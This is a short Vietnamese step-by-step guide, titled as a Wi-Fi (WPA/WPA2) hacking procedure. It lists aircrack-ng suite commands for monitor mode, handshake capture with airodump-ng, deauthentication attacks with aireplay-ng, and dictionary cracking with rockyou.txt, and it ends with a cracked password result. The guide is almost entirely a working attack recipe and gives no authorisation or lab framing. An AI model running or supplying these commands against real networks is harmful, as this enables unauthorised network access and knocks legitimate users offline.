## 🛠️ Các bước thực hiện hack Wi-Fi (WPA/WPA2)

```bash
1. iwconfig
```

→ Kiểm tra các thiết bị kết nối mạng không dây.

```bash
2. sudo airmon-ng start wlan0
```

→ Bật chế độ monitor cho card mạng.

```bash
3. sudo airmon-ng check kill
```

→ Dừng các dịch vụ gây xung đột.

```bash
4. sudo airodump-ng wlan0mon
```

→ Quét và thu thập thông tin mạng Wi-Fi.
**Ctrl + C** để thoát.

```bash
5. sudo airodump-ng --bssid <bssid> --channel <ch> --write wpa2hack wlan0mon
```

→ Bắt handshake WPA/WPA2 từ một Wi-Fi và lưu vào file `wpa2hack.cap`.

```bash
6. sudo aireplay-ng --deauth 4 -a <bssid> -c <station> wlan0mon
```

→ Gửi gói `deauth` để ngắt kết nối thiết bị khỏi Wi-Fi.
Mục đích: ép thiết bị kết nối lại để bết handshake.

```bash
7. sudo aircrack-ng <file.cap> -w /usr/share/wordlists/rockyou.txt
```

→ Dò mật khẩu Wi-Fi bằng file từ điển `rockyou.txt`.

---

### ✅ Kết quả:

```
Sanh Dieu [ 00001111 ]
```
